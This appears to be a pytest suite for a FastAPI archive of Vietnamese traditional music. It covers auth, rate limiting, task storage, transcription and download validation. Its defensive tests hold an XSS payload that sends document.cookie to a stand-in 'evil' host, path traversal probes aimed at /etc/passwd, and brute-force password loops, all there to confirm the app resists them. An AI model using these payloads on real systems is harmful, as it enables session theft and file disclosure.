import io
import json
import struct
import wave

from fastapi.testclient import TestClient

from app.main import app
from app.database.session import SessionLocal
from app.database import crud
from app.config import settings
from app.ai import basic_pitch_amt as bp_amt


def make_sine_wav(freq=440.0, duration=1.0, sr=16000):
    bio = io.BytesIO()
    w = wave.open(bio, "wb")
    w.setnchannels(1)
    w.setsampwidth(2)
    w.setframerate(sr)
    n = int(sr * duration)
    frames = [int(0.8 * 32767 * __import__("math").sin(2 * 3.141592653589793 * freq * i / sr)) for i in range(n)]
    w.writeframes(struct.pack("<%dh" % n, *frames))
    w.close()
    return bio.getvalue()


def test_auth_register_login_and_guard():
    client = TestClient(app)
    r = client.post("/api/auth/register", json={"username": "ghita", "email": "ghita@gmail.com", "password": "hue12345", "invite_code": "TESTINVITE"})
    assert r.status_code == 200
    token = r.json()["token"]
    assert token.count(".") == 3
    r = client.post("/api/auth/login", json={"username": "ghita", "password": "hue12345"})
    assert r.status_code == 200
    r = client.post("/api/auth/login", json={"username": "ghita", "password": "wrong-pass"})
    assert r.status_code == 401
    r = client.post("/api/auth/register", json={"username": "ghita", "email": "ghita2@gmail.com", "password": "hue12345", "invite_code": "TESTINVITE"})
    assert r.status_code == 409
    r = client.post("/api/auth/register", json={"username": "x", "email": "x@gmail.com", "password": "123", "invite_code": "TESTINVITE"})
    assert r.status_code == 400


def test_auth_guard_blocks_writes_when_required(monkeypatch):
    monkeypatch.setattr(settings, "auth_required", True)
    client = TestClient(app)
    data = make_sine_wav()
    r = client.post("/api/heritage/upload", files={"file": ("a.wav", data, "audio/wav")})
    assert r.status_code == 401
    r = client.post("/api/auth/register", json={"username": "guarduser", "email": "guard@gmail.com", "password": "pass1234", "invite_code": "TESTINVITE"})
    assert r.status_code == 200
    token = r.json()["token"]
    r = client.post(
        "/api/heritage/upload",
        files={"file": ("a.wav", data, "audio/wav")},
        headers={"Authorization": "Bearer " + token},
    )
    assert r.status_code == 200
    monkeypatch.setattr(settings, "auth_required", False)


def test_heritage_metadata_and_search():
    client = TestClient(app)
    data = make_sine_wav(freq=330.0, duration=0.5)
    meta = {
        "title": "Nam Bình",
        "type": "Ca Huế",
        "genre": "Ca Huế",
        "artisans": "Sáu Thùng",
        "performers": "Thanh Năm",
        "instruments": "đàn tranh, đàn nguyệt",
        "location": "Huế",
        "recorded_time": "1968",
        "bpm": "80",
    }
    r = client.post("/api/heritage/upload", files={"file": ("nambinh.wav", data, "audio/wav")}, data=meta)
    assert r.status_code == 200
    body = r.json()
    assert body["artisans"] == "Sáu Thùng"
    assert body["bpm"] == 80.0
    assert body["instruments"] == "đàn tranh, đàn nguyệt"
    item_id = body["id"]
    r = client.get(f"/api/heritage/{item_id}")
    assert r.status_code == 200
    assert r.json()["recorded_time"] == "1968"
    r = client.get("/api/heritage", params={"q": "đàn tranh"})
    assert any(i["id"] == item_id for i in r.json()["items"])
    r = client.get("/api/heritage", params={"q": "Sáu Thùng"})
    assert any(i["id"] == item_id for i in r.json()["items"])
    r = client.get("/api/heritage", params={"q": "1968"})
    assert any(i["id"] == item_id for i in r.json()["items"])


def test_transcribe_basic_pitch_detects_440hz():
    import pytest
    if not bp_amt.available():
        pytest.skip("basic_pitch unavailable")
    try:
        bp_amt.transcribe([0.0] * 1600, 16000)
    except Exception:
        pytest.skip("basic-pitch engine not runnable (missing tflite/tf runtime)")
    client = TestClient(app)
    data = make_sine_wav(freq=440.0, duration=1.2)
    r = client.post("/api/music/transcribe", files={"file": ("t.wav", data, "audio/wav")}, data={"bpm": "60", "engine": "basic_pitch"})
    assert r.status_code == 200
    body = r.json()
    assert body["engine"] == "basic_pitch"
    assert body["count"] >= 1
    midis = {n["midi"] for n in body["notes"]}
    assert 69 in midis


def test_transcribe_dsp_engine_still_works():
    client = TestClient(app)
    data = make_sine_wav(freq=440.0, duration=1.0)
    r = client.post("/api/music/transcribe", files={"file": ("t.wav", data, "audio/wav")}, data={"bpm": "60", "engine": "dsp"})
    assert r.status_code == 200
    assert r.json()["engine"] == "dsp"


def test_tasks_persisted_in_db():
    db = SessionLocal()
    task = crud.create_task(db, "transcribe", {"bpm": 60})
    assert task.status == "pending"
    updated = crud.update_task(db, task.id, status="done", result={"count": 3}, finished=True)
    assert updated.status == "done"
    d = crud.task_to_dict(updated)
    assert d["result"]["count"] == 3
    assert d["finished_at"] is not None
    listed = crud.list_tasks(db, kind="transcribe", status="done")
    assert any(t.id == task.id for t in listed)
    db.close()


def test_task_api_roundtrip():
    client = TestClient(app)
    r = client.post("/api/task", params={"kind": "restore"})
    assert r.status_code == 400
    r = client.post("/api/task", json={"kind": "generic"}, params={"kind": "generic"})
    assert r.status_code == 200
    tid = r.json()["id"]
    r = client.get(f"/api/task/{tid}")
    assert r.status_code == 200
    r = client.get("/api/task")
    assert isinstance(r.json(), list)


def test_register_failure_bucket_limits(monkeypatch):
    import uuid as _uuid

    from app import rate_limit
    from app.api import auth as auth_mod

    monkeypatch.setattr(settings, "register_failure_ip_limit", 3, raising=False)
    rate_limit.reset()
    auth_mod._register_ip_failures.pop("regfail:testclient", None)
    try:
        client = TestClient(app)
        codes = []
        for i in range(5):
            r = client.post("/api/auth/register", json={
                "username": f"regfail{_uuid.uuid4().hex[:8]}",
                "email": f"rf{i}@x.local",
                "password": "OkPass#2026x",
                "invite_code": "SAI-MA-MOI-XX",
            })
            codes.append(r.status_code)
        assert codes[:3] == [400, 400, 400], codes
        assert codes[3:] == [429, 429], codes
    finally:
        auth_mod._register_ip_failures.pop("regfail:testclient", None)


def test_change_password_bruteforce_locked():
    import uuid as _uuid

    uname = f"chgbrute{_uuid.uuid4().hex[:10]}"
    client = TestClient(app)
    r = client.post("/api/auth/register", json={
        "username": uname, "email": f"{uname}@x.local",
        "password": "Victim#2026a", "invite_code": "TESTINVITE",
    })
    assert r.status_code == 200
    tok = r.json()["token"]
    codes = []
    for i in range(8):
        r = client.post("/api/auth/change-password", json={
            "old_password": f"WrongBrute#{i}xx",
            "new_password": "NewPass#2026z",
        }, headers={"Authorization": f"Bearer {tok}"})
        codes.append(r.status_code)
    assert codes[:4] == [401, 401, 401, 401], codes
    assert all(code == 429 for code in codes[4:]), codes
    r = client.post("/api/auth/change-password", json={
        "old_password": "Victim#2026a", "new_password": "NewPass#2026z",
    }, headers={"Authorization": f"Bearer {tok}"})
    assert r.status_code == 200
    new_tok = r.json()["token"]
    me = client.get("/api/auth/me", headers={"Authorization": f"Bearer {new_tok}"})
    assert me.status_code == 200
    assert me.json()["username"] == uname


def test_task_params_payload_stored_inert():
    payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
    client = TestClient(app)
    r = client.post(
        "/api/task",
        params={"kind": "generic"},
        json={"note": payload, "params": {"q": payload}},
    )
    assert r.status_code == 200
    tid = r.json()["id"]
    r = client.get(f"/api/task/{tid}")
    assert r.status_code == 200
    assert r.headers.get("content-type", "").startswith("application/json")
    assert "text/html" not in r.headers.get("content-type", "")
    assert "default-src" in r.headers.get("content-security-policy", "")
    assert r.headers.get("x-content-type-options", "").lower() == "nosniff"
    body = r.json()
    assert body["params"]["note"] == payload
    listed = client.get("/api/task")
    assert listed.headers.get("content-type", "").startswith("application/json")
    assert "text/html" not in listed.headers.get("content-type", "")


def test_musicxml_dotted_output():
    from app.services import musicxml_service

    notes = [{"midi": 69, "freq": 440.0, "start": 0.0, "end": 1.5, "velocity": 80}]
    xml = musicxml_service.build_musicxml(notes, 60.0, "dotted")
    assert "<type>quarter</type>" in xml
    assert "<dot" in xml


def test_task_dispatch_inline(monkeypatch):
    from app.workers import queue as task_queue
    from app.storage import manager as storage_manager
    from app.database import crud
    from app.database.session import SessionLocal

    monkeypatch.setattr(task_queue, "_enqueue_rq", lambda *a, **k: False)
    wav = make_sine_wav(freq=523.25, duration=0.8)
    digest = storage_manager.sha256_bytes(wav)
    audio_path = storage_manager.original_dir() / f"{digest}.wav"
    audio_path.parent.mkdir(parents=True, exist_ok=True)
    audio_path.write_bytes(wav)
    db = SessionLocal()
    try:
        item = crud.create_item(db, "Dispatch Tone", "bai_hat", digest, "dispatch.wav", len(wav))
        crud.create_audio(db, item.id, "original", str(audio_path), digest, len(wav))
        heritage_id = item.id
    finally:
        db.close()
    client = TestClient(app)
    r = client.post("/api/task", json={"heritage_id": heritage_id, "params": {"bpm": 60}}, params={"kind": "transcribe"})
    assert r.status_code == 200
    tid = r.json()["id"]
    import time as _time
    status = "pending"
    for _ in range(50):
        task = client.get(f"/api/task/{tid}").json()
        status = task["status"]
        if status in ("done", "error"):
            break
        _time.sleep(0.1)
    assert status == "done"
    assert client.get(f"/api/task/{tid}").json()["result"]["engine"] in ("basic_pitch", "dsp")
    listed = client.get("/api/task", params={"kind": "transcribe"}).json()
    assert any(t["id"] == tid for t in listed)


def test_heritage_tunes_and_sing_endpoints():
    client = TestClient(app)
    r = client.get("/api/music/heritage-tunes")
    assert r.status_code == 200
    tunes = r.json()
    assert isinstance(tunes, list)
    assert len(tunes) > 0
    first = tunes[0]
    assert "mode_system" in first
    assert "verse_structure" in first
    assert "rhyme_guide" in first
    assert "lyrics_with_ornaments" in first
    assert "featured_in_creation" in first

    r_orig = client.post("/api/music/sing-original", params={"heritage_id": first["id"], "vocal": "Nữ", "duration": 60})
    assert r_orig.status_code == 200
    task_orig = r_orig.json()
    assert task_orig["kind"] == "sing_original"

    r_new = client.post("/api/music/sing-new-lyrics", params={"heritage_id": first["id"], "new_lyrics": "Thương ai chín đợi mười chờ", "vocal": "Nữ", "duration": 60})
    assert r_new.status_code == 200
    task_new = r_new.json()
    assert task_new["kind"] == "sing_new_lyrics"

    r_body = client.post(
        "/api/music/sing-new-lyrics",
        params={"heritage_id": first["id"], "vocal": "Nữ", "duration": 60},
        json={"new_lyrics": "A í a tình tang ơ hò"},
    )
    assert r_body.status_code == 200
    assert r_body.json()["kind"] == "sing_new_lyrics"

    r_empty_body = client.post(
        "/api/music/sing-new-lyrics",
        params={"heritage_id": first["id"], "vocal": "Nữ", "duration": 60},
        json={"new_lyrics": ""},
    )
    assert r_empty_body.status_code == 400

    bad = client.post("/api/music/sing-original", params={"heritage_id": ""})
    assert bad.status_code == 400
    not_found = client.post("/api/music/sing-original", params={"heritage_id": "non-existent-id-999"})
    assert not_found.status_code == 404


def test_web_app_serving_and_spa_routing():
    from pathlib import Path as _Path

    from app.config import settings as _settings

    web_built = (_Path(_settings.web_dir) / "index.html").exists()
    client = TestClient(app)

    r_root = client.get("/")
    assert r_root.status_code == 200

    r_api_404 = client.get("/api/unknown-endpoint-test-404")
    assert r_api_404.status_code == 404
    assert r_api_404.json() == {"detail": "Not Found"}

    if not web_built:
        # môi trường CI không build web: / trả JSON, SPA route 404 — đủ để xác nhận server sống
        assert "json" in r_root.headers.get("content-type", "")
        assert client.get("/creation").status_code in (200, 404)
        return

    assert "text/html" in r_root.headers.get("content-type", "")
    r_spa = client.get("/creation")
    assert r_spa.status_code == 200
    assert "text/html" in r_spa.headers.get("content-type", "")

    r_static = client.get("/flutter.js")
    assert r_static.status_code == 200
    assert "Cache-Control" in r_static.headers

    r_traversal = client.get("/%2e%2e/etc/passwd")
    assert r_traversal.status_code == 400


def test_gzip_compression_enabled():
    client = TestClient(app)
    r = client.get("/api/heritage", headers={"Accept-Encoding": "gzip"})
    assert r.status_code == 200
    assert len(r.content) > 0


def test_generated_download_rejects_windows_drive_relative_path():
    client = TestClient(app)
    r = client.get("/api/music/generated/C:evil.mp3")
    assert r.status_code == 400
    assert r.json() == {"detail": "bad filename"}


def test_generated_download_rejects_traversal_and_junk():
    client = TestClient(app)
    assert client.get("/api/music/generated/..%2F..%2Fx.mp3").status_code in (400, 404)
    assert client.get("/api/music/generated/x%5C..%2Fy.mp3").status_code in (400, 404)
    assert client.get("/api/music/generated/normal.mp3.txt").status_code == 400
    assert client.get("/api/music/generated/-bad name!.mp3").status_code == 400


def test_generated_download_accepts_valid_shape():
    client = TestClient(app)
    r = client.get("/api/music/generated/Abc123_-xyz.mp3")
    assert r.status_code == 404


